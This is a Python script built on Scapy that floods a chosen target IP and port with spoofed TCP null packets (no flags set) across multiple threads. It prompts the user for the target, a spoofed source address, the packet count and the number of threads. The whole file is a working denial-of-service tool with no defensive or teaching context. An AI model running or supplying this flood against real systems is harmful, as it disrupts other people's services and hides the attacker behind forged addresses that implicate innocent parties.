from scapy.all import *
import random
import threading

def send_null_packet(target_ip, spoofed_ip, port):
    """Sends a single spoofed null packet to the target."""
    # Create an IP packet with a spoofed source IP
    ip = IP(src=spoofed_ip, dst=target_ip)

    # Create a TCP packet with no flags and random sequence number
    tcp = TCP(sport=random.randint(1024, 65535), dport=port, flags="", seq=random.randint(0, 4294967295))

    # Send the packet
    send(ip / tcp, verbose=False)

def threaded_packet_flood(target_ip, spoofed_ip, port, packet_count, threads):
    """
    Launches a multi-threaded packet flood with spoofed null packets.
    
    Parameters:
    target_ip (str)   : IP address of the target server.
    spoofed_ip (str)  : IP address to spoof.
    port (int)        : Target port on the server.
    packet_count (int): Total number of packets to send.
    threads (int)     : Number of threads to use for sending.
    """
    print(f"Starting threaded flood: {packet_count} packets from {spoofed_ip} to {target_ip}:{port} with {threads} threads...")

    def worker():
        """Thread worker to send packets."""
        packets_per_thread = packet_count // threads
        for _ in range(packets_per_thread):
            send_null_packet(target_ip, spoofed_ip, port)

    # Create and start threads
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=worker)
        thread_list.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in thread_list:
        thread.join()

    print("Packet flood complete.")

# User inputs for target IP, spoofed IP, port, packet count, and thread count
if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    spoofed_ip = input("Enter spoofed IP: ")
    port = int(input("Enter target port: "))
    packet_count = int(input("Enter total number of packets: "))
    threads = int(input("Enter number of threads: "))

    threaded_packet_flood(target_ip, spoofed_ip, port, packet_count, threads)
